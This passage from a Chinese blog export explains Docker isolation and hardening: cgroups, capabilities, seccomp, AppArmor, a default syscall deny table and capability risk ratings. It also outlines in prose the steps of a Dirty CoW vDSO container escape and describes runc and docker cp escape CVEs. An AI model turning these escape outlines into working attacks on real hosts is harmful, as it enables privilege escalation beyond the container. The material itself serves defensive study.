/sys/fs/cgroup/cpu/mycgroup/tasks\n```\n\n上面的方案有个缺陷，运行完之后原来的 shell 还在 cgroup 中。如果希望进程运行完不影响当前使用的 shell，可以另起一个临时的 shell：\n\n```bash\nsh -c \"echo \\$$ > /sys/fs/cgroup/memory/mycgroup/tasks & & stress -m 1\"\n```\n\n#### 把进程移动到 cgroup\n\n如果想要把进程移动到另外一个 cgroup，只要使用 `echo` 把进程 PID 写入到 cgroup tasks 文件中即可，原来 cgroup tasks 文件会自动删除该进程。\n\n## Docker使用cgroup\n\n默认情况下，Docker 启动一个容器后，会在 `/sys/fs/cgroup`目录下的各个资源目录下生成以容器 ID 为名字的目录（group），比如：\n\n```bash\n/sys/fs/cgroup/cpu/docker/03dd196f415276375f754d51ce29b418b170bd92d88c5e420d6901c32f93dc14\n```\n\n此时 cpu.cfs_quota_us 的内容为 -1，表示默认情况下并没有限制容器的 CPU 使用。在容器被 stopped 后，该目录被删除。\n\n运行命令 `docker run -d --name web41 --cpu-quota 25000 --cpu-period 100 --cpu-shares 30 training/webapp python app.py` 启动一个新的容器，结果：\n\n```bash\nroot@devstack:/sys/fs/cgroup/cpu/docker/06bd180cd340f8288c18e8f0e01ade66d066058dd053ef46161eb682ab69ec24# cat cpu.cfs_quota_us\n25000\nroot@devstack:/sys/fs/cgroup/cpu/docker/06bd180cd340f8288c18e8f0e01ade66d066058dd053ef46161eb682ab69ec24# cat tasks\n3704\nroot@devstack:/sys/fs/cgroup/cpu/docker/06bd180cd340f8288c18e8f0e01ade66d066058dd053ef46161eb682ab69ec24# cat cpu.cfs_period_us\n2000\n```\n\nDocker 会将容器中的进程的 ID 加入到各个资源对应的 tasks 文件中。表示 Docker 也是以上面的机制来使用 cgroups 对容器的 CPU 使用进行限制。\n\n相似地，可以通过 `docker run` 中 `mem` 相关的参数对容器的内存使用进行限制：\n\n```bash\n      --cpuset-mems string          MEMs in which to allow execution (0-3, 0,1)\n      --kernel-memory string        Kernel memory limit\n  -m, --memory string               Memory limit\n      --memory-reservation string   Memory soft limit\n      --memory-swap string          Swap limit equal to memory plus swap: '-1' to enable unlimited swap\n      --memory-swappiness int       Tune container memory swappiness (0 to 100) (default -1)\n```\n\n比如` docker run -d --name web42 --blkio-weight 100 --memory 10M --cpu-quota 25000 --cpu-period 2000 --cpu-shares 30 training/webapp python app.py`：\n\n```bash\nroot@devstack:/sys/fs/cgroup/memory/docker/ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410# cat memory.limit_in_bytes\n10485760\nroot@devstack:/sys/fs/cgroup/blkio/docker/ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410# cat blkio.weight\n 100\n```\n\n目前 docker 已经几乎支持了所有的 cgroups 资源，可以限制容器对包括 network，device，cpu 和 memory 在内的资源的使用，比如：\n\n```bash\nroot@devstack:/sys/fs/cgroup# find -iname ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410\n./net_prio/docker/ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410\n./net_cls/docker/ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410\n./systemd/docker/ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410\n./hugetlb/docker/ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410\n./perf_event/docker/ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410\n./blkio/docker/ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410\n./freezer/docker/ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410\n./devices/docker/ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410\n./memory/docker/ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410\n./cpuacct/docker/ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410\n./cpu/docker/ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410\n./cpuset/docker/ec8d850ebbabaf24df572cb5acd89a6e7a953fe5aa5d3c6a69c4532f92b57410\n```\n\n# Capbilities\n\n## capbilities查看\n\n在上一篇文章中介绍了capbilities了，实际是一种把root权限细分的技术，现在介绍下docker中的capbilities的使用。\n\n列出系统支持的capability使用命令 `capsh --print` ，查看dockerd进程所有capbilities：\n\n```bash\nroot@PEK1000251892:~# cat /proc/`pidof dockerd`/status | grep Cap\nCapInh: 0000000000000000\nCapPrm: 0000003fffffffff\nCapEff: 0000003fffffffff\nCapBnd: 0000003fffffffff\nCapAmb: 0000000000000000\n```\n\n解码\n\n```bash\nroot@PEK1000251892:~# capsh --decode=0000003fffffffff\n0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37\n```\n\n和getpcaps得到结果一样\n\n```bash\nroot@PEK1000251892:~# getpcaps `pidof dockerd`\nCapabilities for `116548': = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+ep\n```\n\n## Docker默认capbilities\n\nDocker 能调整容器中的进程针对主机上的 OS 功能的访问授权，这些功能访问授权称为 capability。 Docker 在创建容器时，会默认去除一组 capability，包括：\n\n- SETPCAP: 修改进程的 capability\n- SYS_MODULE: 插入/删除内核模块\n- SYS_RAWIO: 修改内核内存\n- SYS_PACCT: 配置进程的记账\n- SYS_NICE: 修改进程的优先级\n- SYS_RESOURCE: 覆盖资源的限制\n- SYS_TIME: 修改系统时钟\n- SYS_TTY_CONFIG: 配置 TTY 设备\n- AUDIT_WRITE: 写审计日志\n- AUDIT_CONTROL: 配置审计子系统\n- MAC_OVERRIDE: 忽略内核 MAC 策略\n- MAC_ADMIN: 配置 MAC 设置信息\n- SYSLOG: 修改内核的 print 行为\n- NET_ADMIN: 配置网络\n- SYS_ADMIN: 表示系统管理的全部功能\n\nDocker为了确保容器的安全，仅仅支持了其中的**14项基本的 Capabilities**，现在，我们不妨来看看这些 Capabilities 到底有哪些，它们分别是： `CAP_CHOWN` 、 `CAP_DAC_OVERRIDE` 、 `CAP_FSETID` 、 `CAP_MKNOD` 、 `FOWNER` 、 `NET_RAW` 、 `SETGID` 、 `SETUID` 、 `SETFCAP` 、 `SETPCAP` 、 `NET_BIND_SERVICE` 、 `SYS_CHROOT` 、 `KILL` 和 `AUDIT_WRITE` 。  在这 14 项中几乎没有一项涉及到系统管理权限，比如 Docker 容器的 root 用户不具备 CAP_SYS_ADMIN，磁盘限额操作、mount 操作、创建进程新命名空间等均无法实现；比如由于没有 CAP_NET_ADMIN，网络方面的配置管理也将受到管制。因此，默认情况下，Docker 容器中的 root 用户并没有以往我们想象得那么能力超群，Docker 依然对其存在限制，这样设计的出发点之一自然是安全。 \n\n添加容器的 capability 用 `--cap-add`，去除容器的 capability 用 `--cap-drop`。 Linux 文档中的所有 capability 名都是以 `CAP_` 开头的全部大写字母，但是这里用其不带前缀的小字版本。例子：\n\n```bash\n$ docker run --rm -u nobody \\\n    ubuntu:latest \\\n    /bin/bash -c \"capsh --print | grep net_raw\"\n\nCurrent: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+i\n    Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap\n\n$ docker run --rm -u nobody \\\n    --cap-drop net_raw \\ # drop NET_RAW capability\n    ubuntu:latest \\\n    /bin/bash -c \"capsh --print | grep net_raw\" # no output\n\n$ docker run --rm -u nobody \\\n    ubuntu:latest \\\n    /bin/bash -c \"capsh --print | grep sys_admin\" # no output\n\n$ docker run --rm -u nobody \\\n    --cap-add sys_admin \\\n    ubuntu:latest \\\n    /bin/bash -c \"capsh --print | grep sys_admin\"\n\nurrent: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap+i\nBounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap\nhp\n```\n\n# seccomp\n\n## 使用\n\n**Seccomp**是**Secure computing mode**的缩写，它是Linux内核提供的一个操作，用于**限制一个进程可以执行的系统调用**。当然，我们需要有一个配置文件来指明进程到底可以执行哪些系统调用，不可以执行哪些系统调用。\n\n在Docker中，它使用Seccomp来限制一个容器可以执行的系统调用。\n\n默认情况下，**Seccomp**会禁止容器执行64位Linux系统的313个系统调用的44个。我找不到这个**Seccomp**的默认配置文件在哪，可能是写在了源码中。\n\n我们下面来描述如何使用**Seccomp**。\n\n```bash\n$ grep CONFIG_SECCOMP= /boot/config-$(uname -r)\nCONFIG_SECCOMP=y\n```\n\n首先，创建一个配置文件:**/home/ygy/seccomp/profile.json**,其内容为:\n\n```json\n{\n    \"defaultAction\": \"SCMP_ACT_ALLOW\",\n    \"syscalls\": [\n        {\n            \"name\": \"chmod\",\n            \"action\": \"SCMP_ACT_ERRNO\"\n        }\n    ]\n}\n```\n\n在上面的这个配置文件中，默认情况下，我们允许容器执行全部的系统调用．但是，禁止它执行**chmod**这个系统调用．\n\n然后，我们用这个**Seccomp**配置文件来启动一个Docker容器:\n\n```bash\ndocker run --rm -it --security-opt seccomp:/home/ygy/seccomp/profile.json busybox chmod 400 /etc/hosts\n```\n\n结果如下:\n\n```bash\nchmod: /etc/hosts: Operation not permitted\n```\n\n使用`docker inspect`查看容器详细信息，有如下输出：\n\n```json\n \"SecurityOpt\": [\n                \"seccomp:     \n                  {\"defaultAction\":\"SCMP_ACT_ALLOW\",\n                  \"syscalls\":[{\"name\":\"chmod\",\"action\":\"SCMP_ACT_ERRNO\"}]}\"\n            ],\n```\n\n我们也可以在`run`一个容器的时候，通过`--security-opt seccomp:unconfined`参数来允许容器执行全部的系统的调用。\n\n```bash\ndocker run --rm -it --security-opt seccomp:unconfined busybox chmod 400 /etc/hosts\n```\n\n## 默认策略\n\ndocker seccomp使用白名单策机制，默认的策略列表： https://github.com/moby/moby/blob/master/profiles/seccomp/default.json \n\n一些重要的[系统调用](https://docs.docker.com/engine/security/seccomp/)如下：（不完整列表）\n\n| Syscall             | Description                                                  |\n| :------------------ | :----------------------------------------------------------- |\n| `acct`              | Accounting syscall which could let containers disable their own resource limits or process accounting. Also gated by `CAP_SYS_PACCT`. |\n| `add_key`           | Prevent containers from using the kernel keyring, which is not namespaced. |\n| `bpf`               | Deny loading potentially persistent bpf programs into kernel, already gated by `CAP_SYS_ADMIN`. |\n| `clock_adjtime`     | Time/date is not namespaced. Also gated by `CAP_SYS_TIME`.   |\n| `clock_settime`     | Time/date is not namespaced. Also gated by `CAP_SYS_TIME`.   |\n| `clone`             | Deny cloning new namespaces. Also gated by `CAP_SYS_ADMIN` for CLONE_* flags, except `CLONE_USERNS`. |\n| `create_module`     | Deny manipulation and functions on kernel modules. Obsolete. Also gated by `CAP_SYS_MODULE`. |\n| `delete_module`     | Deny manipulation and functions on kernel modules. Also gated by `CAP_SYS_MODULE`. |\n| `finit_module`      | Deny manipulation and functions on kernel modules. Also gated by `CAP_SYS_MODULE`. |\n| `get_kernel_syms`   | Deny retrieval of exported kernel and module symbols. Obsolete. |\n| `get_mempolicy`     | Syscall that modifies kernel memory and NUMA settings. Already gated by `CAP_SYS_NICE`. |\n| `init_module`       | Deny manipulation and functions on kernel modules. Also gated by `CAP_SYS_MODULE`. |\n| `ioperm`            | Prevent containers from modifying kernel I/O privilege levels. Already gated by `CAP_SYS_RAWIO`. |\n| `iopl`              | Prevent containers from modifying kernel I/O privilege levels. Already gated by `CAP_SYS_RAWIO`. |\n| `kcmp`              | Restrict process inspection capabilities, already blocked by dropping `CAP_PTRACE`. |\n| `kexec_file_load`   | Sister syscall of `kexec_load` that does the same thing, slightly different arguments. Also gated by `CAP_SYS_BOOT`. |\n| `kexec_load`        | Deny loading a new kernel for later execution. Also gated by `CAP_SYS_BOOT`. |\n| `keyctl`            | Prevent containers from using the kernel keyring, which is not namespaced. |\n| `lookup_dcookie`    | Tracing/profiling syscall, which could leak a lot of information on the host. Also gated by `CAP_SYS_ADMIN`. |\n| `mbind`             | Syscall that modifies kernel memory and NUMA settings. Already gated by `CAP_SYS_NICE`. |\n| `mount`             | Deny mounting, already gated by `CAP_SYS_ADMIN`.             |\n| `move_pages`        | Syscall that modifies kernel memory and NUMA settings.       |\n| `name_to_handle_at` | Sister syscall to `open_by_handle_at`. Already gated by `CAP_DAC_READ_SEARCH`. |\n| `nfsservctl`        | Deny interaction with the kernel nfs daemon. Obsolete since Linux 3.1. |\n| `open_by_handle_at` | Cause of an old container breakout. Also gated by `CAP_DAC_READ_SEARCH`. |\n| `perf_event_open`   | Tracing/profiling syscall, which could leak a lot of information on the host. |\n| `personality`       | Prevent container from enabling BSD emulation. Not inherently dangerous, but poorly tested, potential for a lot of kernel vulns. |\n| `pivot_root`        | Deny `pivot_root`, should be privileged operation.           |\n| `process_vm_readv`  | Restrict process inspection capabilities, already blocked by dropping `CAP_PTRACE`. |\n| `process_vm_writev` | Restrict process inspection capabilities, already blocked by dropping `CAP_PTRACE`. |\n| `ptrace`            | Tracing/profiling syscall, which could leak a lot of information on the host. Already blocked by dropping `CAP_PTRACE`. Blocked in Linux kernel versions before 4.8 to avoid seccomp bypass. |\n| `query_module`      | Deny manipulation and functions on kernel modules. Obsolete. |\n| `quotactl`          | Quota syscall which could let containers disable their own resource limits or process accounting. Also gated by `CAP_SYS_ADMIN`. |\n| `reboot`            | Don’t let containers reboot the host. Also gated by `CAP_SYS_BOOT`. |\n| `request_key`       | Prevent containers from using the kernel keyring, which is not namespaced. |\n| `set_mempolicy`     | Syscall that modifies kernel memory and NUMA settings. Already gated by `CAP_SYS_NICE`. |\n| `setns`             | Deny associating a thread with a namespace. Also gated by `CAP_SYS_ADMIN`. |\n| `settimeofday`      | Time/date is not namespaced. Also gated by `CAP_SYS_TIME`.   |\n| `stime`             | Time/date is not namespaced. Also gated by `CAP_SYS_TIME`.   |\n| `swapon`            | Deny start/stop swapping to file/device. Also gated by `CAP_SYS_ADMIN`. |\n| `swapoff`           | Deny start/stop swapping to file/device. Also gated by `CAP_SYS_ADMIN`. |\n| `sysfs`             | Obsolete syscall.                                            |\n| `_sysctl`           | Obsolete, replaced by /proc/sys.                             |\n| `umount`            | Should be a privileged operation. Also gated by `CAP_SYS_ADMIN`. |\n| `umount2`           | Should be a privileged operation. Also gated by `CAP_SYS_ADMIN`. |\n| `unshare`           | Deny cloning new namespaces for processes. Also gated by `CAP_SYS_ADMIN`, with the exception of `unshare --user`. |\n| `uselib`            | Older syscall related to shared libraries, unused for a long time. |\n| `userfaultfd`       | Userspace page fault handling, largely needed for process migration. |\n| `ustat`             | Obsolete syscall.                                            |\n| `vm86`              | In kernel x86 real mode virtual machine. Also gated by `CAP_SYS_ADMIN`. |\n| `vm86old`           | In kernel x86 real mode virtual machine. Also gated by `CAP_SYS_ADMIN`. |\n\n不使用seccomp\n\n```bash\n$ docker run --rm -it --security-opt seccomp=unconfined debian:jessie \\\n    unshare --map-root-user --user sh -c whoami\n```\n\n# AppArmor和Selinux\n\ndocker支持apparmor和selinux，默认不启用selinux，启用apparmor。 [AppArmor](https://en.wikipedia.org/wiki/AppArmor) 是一个 Linux 内核安全模块，可用于限制主机操作系统上运行的进程的功能。每个进程都可以拥有自己的安全配置文件。安全配置文件用来允许或禁止特定功能，例如网络访问或文件读/写/执行权限。 \n\n## 加载和卸载profiles\n\n加载一个新的profile\n\n```bash\n$ apparmor_parser -r -W /path/to/your_profile\n```\n\ndocker运行自定义的apparmor策略\n\n```bash\n$ docker run --rm -it --security-opt apparmor=your_profile hello-world\n```\n\n卸载一个\n\n```bash\n$ apparmor_parser -R /path/to/profile\n```\n\n## 默认策略\n\nDocker默认策略生成模板 https://github.com/moby/moby/blob/master/profiles/apparmor/template.go \n\n\n\n**参考：**\n\nhttps://zhuanlan.zhihu.com/p/67586925\n\nhttps://zhuanlan.zhihu.com/p/55099839\n\nhttps://chuanleiguo.com/2018/08/05/Docker-Namespace-Cgroup/\n\nhttps://cizixs.com/2017/08/25/linux-cgroup/\n\nhttps://zhuanlan.zhihu.com/p/98920705\n\nhttps://www.atjiang.com/limiting-risk-with-isolation-in-docker/ ","tags":["namespace","capabilities","seccomp"],"categories":["docker安全"]},{"title":"Docker安全威胁","url":"/2019/08/10/Docker安全威胁/","content":"\n# Docker安全\n\n![img](/images/b2/1.png)\n\n# Docker攻击面\n\n容器一共有7个攻击面：`Linux Kernel、Namespace/Cgroups/Aufs、Seccomp-bpf、Libs、Language VM、User Code、Container(Docker) engine `\n\n**以容器逃逸为风险模型，提炼出3个攻击面：**\n\n> **1. Linux内核漏洞**\n>\n> **2. 容器自身**\n>\n> **3. 不安全部署（配置）**\n\n## 1. Linux内核漏洞\n\n容器的内核与宿主内核共享，使用Namespace与Cgroups这两项技术使容器内的资源与宿主机隔离，所以Linux内核产生的漏洞能导致容器逃逸\n\n**攻击样例说明：**\n\nvDSO（Virtual Dynamic Shared Object）是内核为了减少内核与用户空间频繁切换，提高系统调用效率而设计的机制。它同时映射在内核空间以及每一个进程的虚拟内存中，包括那些以root权限运行的进程。通过调用那些不需要上下文切换（context switching）的系统调用可以加快这一步骤(定位vDSO)。vDSO在用户空间(userspace)映射为R/X，而在内核空间(kernelspace)则为R/W。这允许我们在内核空间修改它，接着在用户空间执行。又因为容器与宿主机内核共享，所以可以直接使用这项技术逃逸容器。\n\n利用步骤如下：\n\n> 1.获取vDSO地址，在新版的glibc中可以直接调用getauxval()函数获取。 \n>\n> 2.通过vDSO地址找到clock_gettime()函数地址，检查是否可以hijack。\n>\n> 3.创建监听socket。\n>\n> 4.触发漏洞，Dirty CoW是由于内核内存管理系统实现CoW时产生的漏洞。通过条件竞争，把握好在恰当的时机，利用CoW的特性可以将文件的read-only映射为write。子进程不停的检查是否成功写入。父进程创建二个线程，ptrace_thread线程向vDSO写入shellcode。\n>\n> madvise_thread线程释放vDSO映射空间，影响ptrace_thread线程CoW的过程，产生条件竞争，当条件触发就能写入成功。\n>\n> 5.执行shellcode，等待从宿主机返回root shell，成功后恢复vDSO原始数据。\n\n## 2. 容器自身\n\ndocker架构图：\n\n![img](/images/b2/2.png)\n\nDocker本身由`docker（docker client）`和`dockerd（docker daemon）`组成。但从Docker 1.11开始，Docker不再是简单的通过`docker dameon`来启动，而是集成许多组件，包括`containerd`、`runc`等等。\n\nDocker client是docker的客户端程序，用于将用户请求发送给dockerd。dockerd实际调用的是`containerd`的`api`接口，containerd是`dockerd`和`runc`之间的一个中间交流组件，主要负责**容器运行、镜像管理**等。containerd向上为dockerd提供了`gRPC`接口，使得dockerd屏蔽下面的结构变化，确保原有接口向下兼容；向下，通过`containerd-shim`与`run`c结合创建及运行容器。\n\n###  CVE-2019-5736\n\n**runc – container breakout vulnerability：**runc在使用文件系统描述符时存在漏洞，该漏洞可导致特权容器被利用，造成容器逃逸以及访问宿主机文件系统；攻击者也可以使用恶意镜像，或修改运行中的容器内的配置来利用此漏洞。 \n\n**漏洞简介**\n\nrunc是一个根据OCI(Open Container Initiative)标准创建并运行容器的CLI tool，目前Docker、Containerd和CRI-O等容器都运行在runc之上。\n\n该漏洞允许恶意容器（以最少的用户交互）覆盖主机上的runc二进制文件，从而获得root权限在主机上执行代码。\n漏洞可能影响通过受影响版本Docker部署的应用、虚拟主机、云服务器。K8s集群，含有受影响runc版本的Linux发行版等。\n\n**该漏洞允许恶意容器（以最少的用户交互）覆盖主机runc二进制文件，从而在主机上以root级别执行代码。**\n\n### CVE-2019-14271\n\n**漏洞简介**\n\n`docker cp`命令使用了`docker-tar`辅助程序，该程序会以宿主机的`root`权限加载容器的`libnss`库，只要攻击者可以攻破容器，构造恶意的`libnss`库，就能逃逸容器获取宿主机`root`权限。\n\n## 3. 不安全部署（配置)\n\n在实际中，经常会遇到这种状况：不同的业务会根据自身业务需求有自己的一套配置，而这套配置并未得到有效的管控审计，使得内部环境变的复杂多样，无形之中又增加了许多风险点。譬如，最常见的：\n\n- 特权容器或者以root权限运行容器。\n\n- 不合理的Capability配置（权限过大的Capability）\n\n### 特权模式\n\n特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。 \n\n使用特权模式启动容器，**可以获取大量设备文件访问权限**。因为当管理员执行`docker run --privileged`时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。 \n\n这种容器适于运行系统管理类的任务，它除了维护自己的文件系统和网络的隔离性外，**能全权访问主机的共享内存、设备、所有的 capability **等。 \n\n![img](/images/b2/3.png)\n\n**查找特权容器命令：**\n\n```bash\ndocker ps --quiet -a | xargs docker inspect --format='{{.Id}} {{.Name}} {{.HostConfig.Privileged}}'\n```\n\n# Docker安全加固\n\n**对于安全实施准则，我们将其分为三个阶段：**\n\n> **1.攻击前：**裁剪攻击面，减少对外暴露的攻击面（本文涉及的场景关键词：隔离）。\n>\n> **2.攻击时：**降低攻击成功率（本文涉及的场景关键词：加固）。\n>\n> **3.攻击后：**减少攻击成功后攻击者所能获取的有价值的信息、数据以及增加留后门难度等。\n\n\n\n**参考：**\n\nhttps://www.atjiang.com/limiting-risk-with-isolation-in-docker/\n\nhttps://zhuanlan.zhihu.com/p/43586159 ","tags":["内核漏洞","特权容器","docker cve"],"categories":["docker安全"]},{"title":"Linux安全机制总结","url":"/2019/08/03/Linux安全机制总结/","content":"\n# Linux权限\n\n在Linux 系统中，一般习惯使用ROOT和非ROOT来表示用户（进程）的权限。ROOT 用户是指系统中 UID 为0的用户，具备最高权限。非 ROOT 用户指UID≠0的用户，通常就是我们所说的普通用户。Linux中UID又分做RUID、EUID、SUID。\n\n- RUID是真实UID, 用于在系统中标识一个用户是谁，当用户使用用户名和密码成功登录后，Linux系统唯一确定了他的RUID。\n\n- EUID表示进程运行时的有效ID，并不需要与RUID相同，用于系统决定用户对资源的访问权限。一般所说的特权进程就是EUID为0的进程。\n- SUID用于**二进制文件对外开放权限**，让程序在执行过程中拥有文件拥有者的权限 。\n\n# capabilities\n\n## 什么是capabilities\n\nCapabilities机制，是在Linux内核2.2之后引入的。它将root用户的权限细分为不同的领域，可以分别启用或禁用。从而，在实际进行特权操作时，如果euid不是root，便会检查是否具有该特权操作所对应的capabilities，并以此为依据，决定是否可以执行特权操作。 \n\n**线程capabilities包含以下5个capabilities集合：**\n\n1. **Effective：**内核进行线程capabilities检查时实际使用到的集合\n2. **Inheritable**：当程序对应的可执行文件设置了inheritable bit位时，调用execve执行该程序会继承调用者的Inheritable集合，并将其加入到permitted集合。但在非root用户下执行execve时，通常不会保留inheritable 集合，可以考虑使用ambient 集合，当一个程序drop掉一个capabilities时，只能通过execve执行SUID置位的程序或者程序的文件带有该capabilities的方式来获得该capabilities\n3. **permitted：**effective集合和inheritable集合的超集，限制了它们的范围，因此如果一个capabilities不存在permitted中，是不可以通过cap_set_proc来获取的。当一个线程从permitted集合中丢弃一个capabilities时，只能通过获取程序可执行文件的capabilities或execve一个set-user-ID-root（以root用户权限运行的）程序来获得\n4. **ambient ：**是在内核4.3之后引入的，用于补充Inheritable使用上的缺陷，ambien集合可以使用函数prctl修改。当程序由于SUID(SGID)bit位而转变UID(GID)，或执行带有文件capabilities的程序时会导致该集合被清空\n\n5. **Bounding：**权限边界，Linux2.6.25引入，cap_bset。\n\n- **P**定义了进程能力集的上限；\n\n- **E**定义了实际生效的能力集，其他能力集都是为了最终影响能力集；\n\n- **I** 定义了可以exec方式继承的能力集（fork子进程继承父进程所有权限）；P、E、I都在Linux2.6引入。\n\n- **B**在Linux2.6.25中引入，主要限制通过exec获得的能力，是I的超集。\n  - 进程运行时，不能向B添加新能力。\n  - 一旦能力被从B中删除，不能添加回来；\n  - 能力被从B中删除后，若已经在I中存在，不删除。\n\n## capabilities对应的特权操作\n\n| 编号 | Capabilities  list   | 风险级别 | 建议     |\n| ---- | -------------------- | -------- | -------- |\n| 1    | CAP_AUDIT_CONTROL    | 中       | 谨慎使用 |\n| 2    | CAP_AUDIT_READ       | 低       | 谨慎使用 |\n| 3    | CAP_AUDIT_WRITE      | 中       | 谨慎使用 |\n| 4    | CAP_BLOCK_SUSPEND    | 低       | 正常使用 |\n| 5    | CAP_CHOWN            | 高       | 禁止使用 |\n| 6    | CAP_DAC_OVERRIDE     | 高       | 禁止使用 |\n| 7    | CAP_DAC_READ_SEARCH  | 高       | 禁止使用 |\n| 8    | CAP_FOWNER           | 高       | 禁止使用 |\n| 9    | CAP_FSETID           | 中       | 禁止使用 |\n| 10   | CAP_IPC_LOCK         | 低/无    | 正常使用 |\n| 11   | CAP_IPC_OWNER        | 中       | 禁止使用 |\n| 12   | CAP_KILL             | 中       | 禁止使用 |\n| 13   | CAP_LEASE            | 中/低    | 禁止使用 |\n| 14   | CAP_LINUX_IMMUTABLE  | 高       | 禁止使用 |\n| 15   | CAP_MAC_ADMIN        | 中/高    | 禁止使用 |\n| 16   | CAP_MAC_OVERRIDE     | 中/高    | 禁止使用 |\n| 17   | CAP_MKNOD            | 高       | 禁止使用 |\n| 18   | CAP_NET_ADMIN        | 中/高    | 谨慎使用 |\n| 19   | CAP_NET_BIND_SERVICE | 低       | 谨慎使用 |\n| 20   | CAP_NET_BROADCAST    | 低/无    | 禁止使用 |\n| 21   | CAP_NET_RAW          | 中/低    | 谨慎使用 |\n| 22   | CAP_SETGID           | 高       | 禁止使用 |\n| 23   | CAP_SETFCAP          | 高       | 禁止使用 |\n| 24   | CAP_SETPCAP          | 高       | 禁止使用 |\n| 25   | CAP_SETUID           | 高       | 禁止使用 |\n| 26   | CAP_SYS_ADMIN        | 高       | 禁止使用 |\n| 27   | CAP_SYS_BOOT         | 中/低    | 禁止使用 |\n| 28   | CAP_SYS_CHROOT       | 高       | 谨慎使用 |\n| 29   | CAP_SYS_MODULE       | 高       | 禁止使用 |\n| 30   | CAP_SYS_NICE         | 低/无    | 正常使用 |\n| 31   | CAP_SYS_PACCT        | 低       | 正常使用 |\n| 32   | CAP_SYS_PTRACE       | 高       | 谨慎使用 |\n| 33   | CAP_SYS_RAWIO        | 高       | 禁止使用 |\n| 34   | CAP_SYS_RESOURCE     | 中/低    | 正常使用 |\n| 35   | CAP_SYS_TIME         | 低       | 谨慎使用 |\n| 36   | CAP_SYS_TTY_CONFIG   | 低       | 正常使用 |\n| 37   | CAP_SYSLOG           | 低       | 正常使用 |\n| 38   | CAP_WAKE_ALARM       | 低       | 正常使用 |\n\n## 查看进程capabilities\n\n- 通过/proc/PID/status 查看：\n\n![img](/images/b1/1.png)\n\n- 通过工具查看，例如getpcaps PID \n\n![img](/images/b2/2.png)\n\n## 查看文件的getcap\n\n```bash\n$ getcap /bin/ping\n /bin/ping = cap_net_raw+ep\n```\n\n```bash\n$ getfattr -d -m \"^security\\\\.\" /bin/ping\n \\# file: bin/ping\n security.capability=0sAQAAAgAgAAAAAAAAAAAAAAAAAAA=\n```\n\n#  AppArmor\n\n## AppArmor简介\n\nAppArmor(Application Armor)是**Linux内核的一个安全模块**，AppArmor允许系统管理员将每个程序与一个安全配置文件关联，从而限制程序的功能。简单的说，AppArmor是与SELinux类似的一个访问控制系统，通过它你可以指定程序可以读、写或运行哪些文件，是否可以打开网络端口等。作为对传统Unix的自主访问控制模块的补充，AppArmor提供了强制访问控制机制，它已经被整合到2.6版本的Linux内核中。 \n\nApparmor有两种工作模式：**enforcement、complain/learning**\n\n- **Enforcement** – 在这种模式下，配置文件里列出的限制条件都会得到执行，并且对于违反这些限制条件的程序会进行日志记录。\n\n- **Complain** – 